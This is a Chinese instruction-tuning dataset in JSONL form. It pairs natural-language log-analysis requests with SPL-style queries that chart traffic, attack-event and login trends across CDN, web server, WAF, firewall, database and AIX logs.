{"input": "按每5分钟分桶统计客户校验请求趋势。", "instruction": "通达信数据，编写查询语句实现如下分析场景", "output": "appname:tdx (NOT \"连接信息\") \"客户校验\" |  bucket timestamp span=5m as ts | stats count() as cnt by ts,TDX.REQUEST_TYPE"}
{"input": "按每5分钟分桶统计普通股票委托请求趋势。", "instruction": "通达信数据，编写查询语句实现如下分析场景", "output": "appname:tdx NOT 连接信息 股票委托   | bucket timestamp span=5m as ts | stats count() as cnt by ts,TDX.REQUEST_TYPE"}
{"input": "按每5分钟分桶统计TDX委托撤单请求趋势。", "instruction": "通达信数据，编写查询语句实现如下分析场景", "output": "appname:tdx NOT 连接信息 委托撤单  | bucket timestamp span=5m as ts | stats count() as cnt by ts,TDX.REQUEST_TYPE"}
{"input": "按每5分钟分桶统计TDX银证转账请求趋势。", "instruction": "通达信数据，编写查询语句实现如下分析场景", "output": "appname:tdx \"银证转账\"  | bucket timestamp span=5m as ts | stats count() as cnt by ts,TDX.REQUEST_TYPE"}
{"input": "按每5分钟分桶统计Session趋势。", "instruction": "负载均衡_A10数据，编写查询语句实现如下分析场景", "output": "appname:a10 tag:a10 a10.event_type:session\n|bucket timestamp span=5m as ts\n| eval ts=formatdate(ts,\"HH:mm\")  \n| stats count() as cnt by ts "}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1小时。统计全部访问IP地域分布", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1小时。统计全部访问IP地域分布，时间轴采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province|eval time=formatdate(ts,\"yyyy-MM-dd HH\")"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1小时。统计全部访问IP的运营商分布", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats count(cdn.geo.isp) as total by ts, cdn.geo.isp"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1小时。统计全部访问IP运营商分布，时间轴采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats count(cdn.geo.isp) as total by ts, cdn.geo.isp|eval time=formatdate(ts,\"yyyy-MM-dd HH\")"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是6小时。统计全部访问IP地域分布", "output": "appname:cdn_log|bucket timestamp span=6h as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1小时。统计全部访问IP地域分布", "output": "appname:squid_log|bucket timestamp span=1h as ts|stats count(squid.geo.province) as total by ts, squid.geo.province"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1天。统计全部访问IP地域分布", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats count(squid.geo.province) as total by ts, squid.geo.province"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1天。统计全部访问IP地域分布，时间轴采用人类可读格式", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats count(squid.geo.province) as total by ts, squid.geo.province|eval time=formatdate(ts,\"yyyy-MM-dd\")"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1天。统计全部访问IP的运营商分布", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats count(squid.geo.isp) as total by ts, squid.geo.isp"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1天。统计全部访问IP运营商分布，时间轴采用人类可读格式", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats count(squid.geo.isp) as total by ts, squid.geo.isp|eval time=formatdate(ts,\"yyyy-MM-dd\")"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1天。统计全部访问IP地域分布", "output": "appname:cdn_log|bucket timestamp span=1d as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是15分钟。统计全部访问IP地域分布", "output": "appname:cdn_log|bucket timestamp span=15m as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是5分钟。统计全部访问IP地域分布，时间轴采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=5m as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province|eval time=formatdate(ts,\"yyyy-MM-dd HH:mm:ss\")"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是5分钟。统计全部访问IP的运营商分布", "output": "appname:cdn_log|bucket timestamp span=5m as ts|stats count(cdn.geo.isp) as total by ts, cdn.geo.isp"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是5分钟。统计全部访问IP运营商分布，时间轴采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=5m as ts|stats count(cdn.geo.isp) as total by ts, cdn.geo.isp|eval time=formatdate(ts,\"yyyy-MM-dd HH:mm:ss\")"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是5分钟。统计全部访问IP地域分布", "output": "appname:cdn_log|bucket timestamp span=5m as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "CDN 日志按分钟查询全部域名下的 IP 请求次数", "output": "appname:cdn_log|bucket timestamp span=1m as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "varnish 日志按天查询全部域名下的 IP 请求次数", "output": "appname:varnish_log|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "varnish 日志按小时查询全部域名下的 IP 请求次数", "output": "appname:varnish_log|bucket timestamp span=1h as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "live.rizhiyi.com。", "instruction": "varnish 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:varnish_log AND varnish.request_domain:live.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "www.rizhiyi.com。", "instruction": "varnish 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:varnish_log AND varnish.request_domain:www.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "images.rizhiyi.com。", "instruction": "varnish 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:varnish_log AND varnish.request_domain:images.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "static.rizhiyi.com。", "instruction": "varnish 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:varnish_log AND varnish.request_domain:static.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "img.rizhiyi.com。", "instruction": "varnish 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:varnish_log AND varnish.request_domain:img.rizhiyi.com|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "www.yottabyte.cn。", "instruction": "varnish 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:varnish_log AND varnish.request_domain:www.yottabyte.cn|bucket timestamp span=1d as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "email.yottabyte.cn。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:email.yottabyte.cn|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "jira.yottabyte.cn。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:jira.yottabyte.cn|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "email.rizhiyi.com。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:email.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "cloud.rizhiyi.com。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:cloud.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "portal.rizhiyi.com。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:portal.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "docs.rizhiyi.com。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:docs.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "rizhiyi.com。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "help.rizhiyi.com。", "instruction": "CDN 日志中，按天查询指定域名的 IP 请求次数", "output": "appname:cdn_log AND cdn.request_domain:help.rizhiyi.com|bucket timestamp span=1d as ts|stats count(cdn.remote_addr) as total by ts,cdn.remote_addr"}
{"input": "", "instruction": "按每 5 分钟统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=5m as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "按每 1 分钟统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=1m as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "按每 10 分钟统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=10m as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "按每 30 分钟统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=30m as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "按每 1 小时统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=1h as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "按每小时统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=1h as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "按每半小时统计 nginx 日志中来自不同运营商的访问量分布", "output": "appname:nginx_log | bucket timestamp span=30m as ts |stats count(nginx.geo.isp) as total by nginx.geo.isp, ts"}
{"input": "", "instruction": "关联 CDN 日志 和 nginx 日志，查询来自 223.74.12.16 的请求，按每 5 分钟统计其请求量和请求 URL", "output": "(appname:nginx_log OR appname:cdn_log) AND (cdn.remote_addr:\"223.74.12.16\" OR nginx.real_ip.last:\"223.74.12.16\") | eval url=coalesce(cdn.request_url, nginx.request_raw.request_url) | bucket timestamp span=5m as ts | stats count() by ts, url"}
{"input": "", "instruction": "统计每10分钟的appname的日志量大于90的数据", "output": "* | bucket timestamp span=10m as ts |stats count() as cnt by ts | where cnt>90"}
{"input": " 按每 30 分钟统计一个点。", "instruction": "数据库审计日志中最近一天各个风险等级事件趋势", "output": "starttime=\"-1d\" (appname:dbaudit AND tag:dbappsecurity) |bucket timestamp span=30m as ts | stats count() as cnt by ts,dbaudit.level"}
{"input": "每小时统计一次。", "instruction": "数据库审计日志中最近一天各个风险等级事件趋势", "output": "starttime=\"-1d\" appname:dbaudit tag:dbappsecurity |bucket timestamp span=1h as ts | stats count() as cnt by ts,dbaudit.level"}
{"input": "", "instruction": "从rizhiyi审计日志中查询最近30天用户登录使用次数按天统计", "output": "starttime=\"-30d\" appname:rizhiyi tag:yottaweb_audit AND action:login|bucket timestamp span=1d as ts |stats count()  as count_ by user_name,ts |rename user_name as \"用户名\",count_ as \"次数\""}
{"input": "最近24小时不同日志变化趋势。", "instruction": "交换机_juniper数据，编写查询语句实现如下分析场景", "output": "starttime=\"-24h\" (* AND appname:switch) AND tag:juniper |bucket timestamp span=30m as ts | stats count() as total by switch.severity,ts"}
{"input": "最近1天用户登入登出次数趋势。", "instruction": "Oracle数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:oracle | bucket timestamp span=10m as ts | stats count() by ts, oracle.ACTION_NAME"}
{"input": "安恒waf每小时入侵事件去重报表。事件描述用来源 waf.message.src_ip.geo.ip、waf.url 和 waf.message.event拼接。。", "instruction": "安恒waf日志数据，编写查询语句实现如下分析场景", "output": "* AND appname:waf tag: dbappsecurity|eval s_ip_url_event= waf.message.src_ip.geo.ip+\"_\"+waf.url+\"_\"+waf.message.event|bucket timestamp span = 1h as ts |stats count() by ts,s_ip_url_event"}
{"input": "安恒waf每小时攻击事件去重报表。事件描述用waf.src_ip，waf.dst_ip，waf.dst_port 和 waf.event_name 字段用下划线连一起。", "instruction": "安恒waf日志数据，编写查询语句实现如下分析场景", "output": " (appname:waf tag:dbappsecurity) AND (waf.event_name:*攻击*) AND waf.src_ip:*  |eval s_ip_d_ip_port_event= waf.src_ip+\"_\"+waf.dst_ip+\"_\"+waf.dst_port+\"_\"+waf.event_name\n|bucket timestamp span = 1h as ts \n|stats count() by ts,s_ip_d_ip_port_event"}
{"input": "绿盟waf每小时入侵事件去重报表。", "instruction": "绿盟waf日志数据，编写查询语句实现如下分析场景", "output": "(( appname:waf tag:nsfocus) AND ( waf.log_category:waf_log_websec)) waf.src_ip:* \n|eval s_ip_d_ip_port_event= waf.src_ip+\"_\"+waf.dst_ip+\"_\"+waf.dst_port+\"_\"+waf.event_type\n|bucket timestamp span = 1h as ts \n|stats count() by ts,s_ip_d_ip_port_event"}
{"input": "被攻击小时级趋势图。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:nsfocus  | bucket timestamp span=1h as ts | stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "请求类型事件小时级趋势。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips  tag:nsfocus | bucket timestamp span=1h as ts | stats count() as a by ips.event_name,ts | rename a as \"请求次数\""}
{"input": "vpn_h3c每天进入日志条数趋势。", "instruction": "华三VPN日志数据，编写查询语句实现如下分析场景", "output": "appname:vpn AND tag:h3c | bucket timestamp span=1d as ts  |stats count(tag)  by tag,ts"}
{"input": "近7天_招聘网站访问趋势。", "instruction": "深信服上网行为审计数据，编写查询语句实现如下分析场景", "output": "starttime=\"-7d\" access_control.result.x.urltype:求职招聘|bucket timestamp span=6h as ts|stats count() by ts,appname"}
{"input": "数据库_oracle_十分钟内用户以sysdba权限连接的次数。", "instruction": "数据库_oracle_数据，编写查询语句实现如下分析场景", "output": "appname:oracle AND tag:audit oracle.osprivilege:SYSDBA |bucket timestamp span=10m as ts |stats count() as cn by oracle.user,ts"}
{"input": "最近一天日志趋势图。", "instruction": "Sonic防火墙数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" (* AND appname:firewall) AND tag:sonicwall | bucket timestamp span=30m as ts | stats count() as total by ts "}
{"input": "主机被攻击趋势图。", "instruction": "天融信防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:tos firewall.type:secure|bucket timestamp span=3m as ts|stats count() by ts,firewall.dst_ip"}
{"input": "被攻击端口趋势图。", "instruction": "天融信防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:tos firewall.type:secure|bucket timestamp span=3m as ts|stats count() by ts,firewall.dst_port"}
{"input": "最近一小时攻击事件去重。", "instruction": "WAF_长亭数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1h\" * AND appname:waf tag:chatin|eval s_ip_url_attack_type= waf.src_ip+\"_\"+waf.url+\"_\"+waf.attack_type|bucket timestamp span = 1h as ts |stats count() by ts,s_ip_url_attack_type"}
{"input": "近一天各类事件趋势。", "instruction": "hillstone_内网感知数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:bds tag:hillstone | bucket timestamp span=1h as ts  | stats count() as cnt by bds.event_type,ts"}
{"input": "小GC每分钟次数趋势。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND gc.invocations:*|bucket timestamp span=1m as ts|stats count(gc.GCREALTIME) as cnt by ts|eval cnt=if(empty(cnt),0,cnt)"}
{"input": "最近一天各个风险等级事件趋势。", "instruction": "安恒数据库审计数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" (appname:dbaudit AND tag:dbappsecurity) |bucket timestamp span=30m as ts | stats count() as cnt by ts,dbaudit.level"}
{"input": "近7天_招聘网站访问趋势。", "instruction": "深信服行为感知数据，编写查询语句实现如下分析场景", "output": "appname:ac tag:sangfor ac.msg.app:*招聘* |bucket timestamp span=3h as ts  |stats count() as cnt by ts "}
{"input": "各类威胁近一天趋势。", "instruction": "奇安信天擎数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:antivirus |bucket timestamp span=30m as ts | stats count() as cnt by ts,anti.log_name"}
{"input": "威胁趋势。", "instruction": "奇安信天擎数据，编写查询语句实现如下分析场景", "output": "appname:antivirus   |bucket timestamp span=30m as ts \n| stats count() as cnt by ts,anti.type"}
{"input": "业务每 1 分钟在线趋势。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei | bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "各域名每 1 分钟在线趋势。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei  | bucket timestamp span=1m as ts | stats count() as count_ by cdn.domain,ts"}
{"input": "业务按 1 分钟趋势总览。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei | bucket timestamp span=1m as ts | stats count() as count_ by ts "}
{"input": "各域名在线按 1 分钟趋势。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei | bucket timestamp span=1m as ts | stats count() as count_ by cdn.domain,ts"}
{"input": "业务命中缓存数按 1 分钟趋势。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei AND cdn.cdn_status:*HIT | bucket timestamp span= 1m as ts  | stats count()  as count_ by appname,ts | rename count_  as \"业务命中趋势\""}
{"input": "业务各节点 3 秒超时请求按 1 分钟趋势趋势。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei cdn.finished_body_response:>3 | bucket timestamp span=1m as ts | stats count() by tag,ts"}
{"input": "被攻击最多的 10 个国家，按每 30 分钟统计攻击趋势图。", "instruction": "防火墙_hillstone数据，编写查询语句实现如下分析场景", "output": "(* IPS) AND appname:firewall tag:hillstone [[\n\t(* IPS) AND appname:firewall tag:hillstone \n\t|top 10 firewall.dst.geo.country\n\t| fields firewall.dst.geo.country]] \n|bucket timestamp span=30m as ts \n| stats count() by ts, firewall.dst.geo.country"}
{"input": "log_river 主题按 partition 分组统计lag积压每分钟趋势。", "instruction": "kafka数据，编写查询语句实现如下分析场景", "output": "appname:kafka tag:performance kafka.topic:log_river |bucket timestamp span=1m as ts|stats count() by ts,kafka.partition,kafka.lag"}
{"input": "topsec_各类事件趋势，每 30 分钟统计一次。", "instruction": "WAF_天融信数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:topsec | bucket timestamp span=30m as ts|stats count() as cnt by ts,waf.event_type"}
{"input": "GC每分钟停顿次数趋势。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND gc.stoptime:*|bucket timestamp span=1m as ts|stats count() as cnt by ts|eval cnt=if(empty(cnt),0,cnt)"}
{"input": "每10 分钟统计被攻击趋势。", "instruction": "ids_topsec数据，编写查询语句实现如下分析场景", "output": "appname:ids tag:topsec ids.dst_ip:*|bucket timestamp span=10m as ts |stats count() by appname,ts"}
{"input": "每1 小时分动作统计趋势。", "instruction": "ids_topsec数据，编写查询语句实现如下分析场景", "output": "appname:ids tag:topsec |bucket timestamp span=1h as ts |stats count() as a by ids.action,ts"}
{"input": "每小时分协议统计趋势。", "instruction": "ids_topsec数据，编写查询语句实现如下分析场景", "output": "appname:ids tag:topsec |bucket timestamp span=1h as ts |stats count()  as cnt by ids.proto,ts"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1月。统计全部访问IP地域分布", "output": "appname:cdn_log|bucket timestamp span=1M as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1月。统计全部访问IP地域分布，时间轴采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=1M as ts|stats count(cdn.geo.province) as total by ts, cdn.geo.province|eval time=formatdate(ts,\"yyyy-MM\")"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1月。统计全部访问IP的运营商分布", "output": "appname:squid_log|bucket timestamp span=1M as ts|stats count(squid.geo.isp) as total by ts, squid.geo.isp"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1月。统计全部访问IP运营商分布，时间轴采用人类可读格式", "output": "appname:squid_log|bucket timestamp span=1M as ts|stats count(squid.geo.isp) as total by ts, squid.geo.isp|eval time=formatdate(ts,\"yyyy-MM\")"}
{"input": "", "instruction": "varnish 日志中，按周查询 IP 请求次数", "output": "appname:varnish_log|bucket timestamp span=1w as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "varnish 日志中，按月查询 IP 请求次数", "output": "appname:varnish_log|bucket timestamp span=1M as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "", "instruction": "按年查询 varnish 日志中 IP 请求次数", "output": "appname:varnish_log|bucket timestamp span=1y as ts|stats count(varnish.remote_addr) as total by ts,varnish.remote_addr"}
{"input": "按每 5 分钟分组统计。", "instruction": "IIS 服务器的请求方式趋势", "output": "appname:middleware tag:iis |bucket timestamp span=5m as ts|stats count() as count_ by middleware.method,ts"}
{"input": "按每 5 分钟分组统计，时间戳改为时分秒格式。", "instruction": "Exchange按标签分组统计事件趋势图", "output": "appname:exchange |bucket timestamp span=5m as ts |stats count() as ct by ts,tag |eval time=formatdate(ts,\"HH:mm:ss\")"}
{"input": "各 IP 按每 30 分钟分组统计。", "instruction": "linux_定时任务执行趋势", "output": "(appname:linux tag:crond) event_name:定时任务事件 |bucket timestamp span=30m as ts  |stats count() as ct by ts,ip"}
{"input": "分登录主机按每 30 分钟分组统计。", "instruction": "aix主机登录失败趋势", "output": "appname:aix AND \"Failed password for\" |bucket timestamp span=30m as ts1|stats count() as ct by aix.dst_host,ts1"}
{"input": "分登录主机按每 10 分钟分组统计。", "instruction": "aix主机登录成功趋势", "output": "appname:aix AND \"Login successful for\" |bucket timestamp span=10m as ts|stats count() as ct by aix.dst_host,ts "}
{"input": "分主机和类型描述，按每 30 分钟分组统计，时间改为HH:mm格式。", "instruction": "errpt报错趋势图", "output": "appname:aix tag:errpt |bucket timestamp span=30m as ts|stats count(hostname) as count_1 by  hostname,aix.type_dec,ts |eval time=formatdate(ts,\"HH:mm\")"}
{"input": "按每30分钟分组统计。", "instruction": "aix各等级事件数趋势", "output": "appname:aix | bucket timestamp span=30m as ts | stats count() as count_ by aix.severity,ts"}
{"input": "按每 30分钟和服务器 IP 地址分组统计。", "instruction": "aix登录失败趋势图", "output": "appname:aix tag:failedlogin [[appname:aix tag:failedlogin|stats count() as count_ by ip|fields ip]] | bucket timestamp span =30m as ts|stats count() by ip,ts"}
{"input": "按每 10 分钟分组统计。", "instruction": "各功能使用趋势", "output": "appname:rizhiyi tag:yottaweb_audit |bucket timestamp  span=10m as ts |stats count() as ct by ts,module_cn"}
{"input": "网神防火墙各攻击类型每小时趋势。", "instruction": "网神数据，编写查询语句实现如下分析场景", "output": "((appname:firewall AND tag:legendsec) AND firewall.mod:ad)|bucket timestamp span = 1h as ts  | stats count() by ts,firewall.attack_name"}
{"input": "每6小时统计一次关键字_报价_邮件趋势。", "instruction": "深信服上网行为审计数据，编写查询语句实现如下分析场景", "output": "tag:mail \"报价\"|bucket timestamp span=6h as ts|stats count() by ts,appname"}
{"input": "按 access_control.message分组，每20分钟统计一次登录登出趋势。", "instruction": "深信服上网行为管理数据，编写查询语句实现如下分析场景", "output": "appname:access_control tag:sangfor access_control.log_type:* | bucket timestamp span=20m as ts | stats count() as cnt by ts,access_control.message"}
{"input": "搜索 info、debug、notice 以外其他 loadbalancing.severity字段值的日志，按每15分钟一次统计f5日志分级别的数量趋势。", "instruction": "f5_dns日志数据，编写查询语句实现如下分析场景", "output": "appname:loadbalancing tag:f5  loadbalancing.severity:*  (NOT loadbalancing.severity:info)  (NOT loadbalancing.severity:debug) (NOT loadbalancing.severity:notice)  |bucket timestamp span=15m as ts |stats count() by ts,loadbalancing.severity"}
{"input": "每15分钟统计境外IP远程登录用户。", "instruction": "HIDS_安全狗数据，编写查询语句实现如下分析场景", "output": "appname:hids tag:safedog  hids.event_type:remoteLogin NOT hids.country:中国| bucket timestamp span=15m as ts |stats count() as cnt by hids.userName"}
{"input": "每15分钟统计境外IP登录主机。", "instruction": "HIDS_安全狗数据，编写查询语句实现如下分析场景", "output": "appname:hids tag:safedog  hids.event_type:remoteLogin NOT hids.country:中国| bucket timestamp span=15m as ts |stats count() as cnt by hids.hostName"}
{"input": "每15分钟统计境外登录地区分布。", "instruction": "HIDS_安全狗数据，编写查询语句实现如下分析场景", "output": "appname:hids tag:safedog  hids.event_type:remoteLogin NOT hids.country:中国| bucket timestamp span=15m as ts |stats count() as cnt by hids.country"}
{"input": "", "instruction": "查找最近一小时内访问量最高的 10 个 URL", "output": "starttime=\"-1h\" appname:apache | bucket timestamp span=1h as ts | stats count() as cnt by ts, url | sort by - cnt | dedup url | head 10"}
{"input": "按每30分钟分桶统计热门资源排名前 10的请求量统计。", "instruction": "Apache日志数据，编写查询语句实现如下分析场景", "output": "appname:apache tag:access AND  [[appname:apache tag:access |stats count() as count_ by middleware.request_path|sort by count_ |limit 10|fields middleware.request_path]] | bucket timestamp span=30m as ts| stats count() as count_ by middleware.request_path,ts"}
{"input": "按每30分钟分桶统计主机登录趋势top10。", "instruction": "aix日志数据，编写查询语句实现如下分析场景", "output": "appname:aix tag:last [[tag:last|stats count(hostname) as count_ by hostname| sort by count_ | limit 10|fields hostname]]\n| bucket timestamp span=30m as ts|stats count(hostname) as count_2 by hostname,ts"}
{"input": "前 10 名 url 按 30 分钟统计请求量趋势。", "instruction": "pf_tomcat数据，编写查询语句实现如下分析场景", "output": "appname:pf_tomcat AND  [[appname:pf_tomcat  |stats count() as count_ by tomcat.uri\t|sort by count_ |limit 10|fields tomcat.uri]] | bucket timestamp span=30m as ts| stats count() as count_ by tomcat.uri,ts"}
{"input": "前 10 名资源按 30 分钟统计请求量趋势。", "instruction": "pf_nginx数据，编写查询语句实现如下分析场景", "output": "appname:pf_nginx AND  [[appname:pf_nginx  |stats count() as count_ by nginx.uri\t|sort by count_ |limit 10|fields nginx.uri]] | bucket timestamp span=30m as ts| stats count() as count_ by nginx.uri,ts"}
{"input": "热门前 10 个资源，分别按 30 分钟分组统计请求量。", "instruction": "瑞数waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:river AND  [[appname:waf tag:river |stats count() as count_ by waf.uri|sort by count_ |limit 10|fields waf.uri]] | bucket timestamp span=30m as ts| stats count() as count_ by waf.uri,ts"}
{"input": "", "instruction": "每五分钟资源访问失败量top10", "output": "appname:vpn tag:sangfor vpn.actype:access* vpn.result:failure appname:vpn tag:sangfor    [[appname:vpn tag:sangfor vpn.actype:access* vpn.result:failure appname:vpn tag:sangfor |stats count(vpn.dst_ip) as count_ by vpn.dst_ip|sort by count_|limit 10|fields  vpn.dst_ip]] | bucket timestamp span=5m as ts|stats count(vpn.dst_ip)  as count_ by vpn.dst_ip,ts"}
{"input": "", "instruction": "每五分钟用户资源访问数量总量top10", "output": "appname:vpn tag:sangfor vpn.actype:access* appname:vpn tag:sangfor  [[appname:vpn tag:sangfor vpn.actype:access* appname:vpn tag:sangfor  |stats count(vpn.login_user) as count_ by vpn.login_user|sort by count_|limit 10|fields  vpn.login_user]] | bucket timestamp span=5m as ts|stats count(vpn.login_user)  as count_ by vpn.login_user,ts"}
{"input": "", "instruction": "每五分钟资源访问成功量top10", "output": "appname:vpn tag:sangfor vpn.actype:access* vpn.result:success appname:vpn tag:sangfor   [[appname:vpn tag:sangfor vpn.actype:access* appname:vpn tag:sangfor  |stats count(vpn.dst_ip) as count_ by vpn.dst_ip|sort by count_|limit 10|fields  vpn.dst_ip]] | bucket timestamp span=5m as ts|stats count(vpn.dst_ip)  as count_ by vpn.dst_ip,ts"}
{"input": "按每 30 分钟和主机名分组统计。", "instruction": "aix主机登录趋势top10", "output": "appname:aix tag:last [[tag:last|stats count(hostname) as count_ by hostname| sort by count_ | limit 10|fields hostname]] | bucket timestamp span =30m as ts|stats count(hostname) as count_2 by hostname,ts"}
{"input": "", "instruction": "我想问有关hillstion防火墙的网络流量使用情况和趋势的信息。", "output": "appname:firewall AND tag:hillstone AND \"session end\"  firewall.receive_byte:* | bucket timestamp span=30m as ts |eval rcv_=tolong(firewall.receive_byte) |stats sum(rcv_) as rcvbyte by hostname,ts  | rename rcvbyte as \"接收字节数\""}
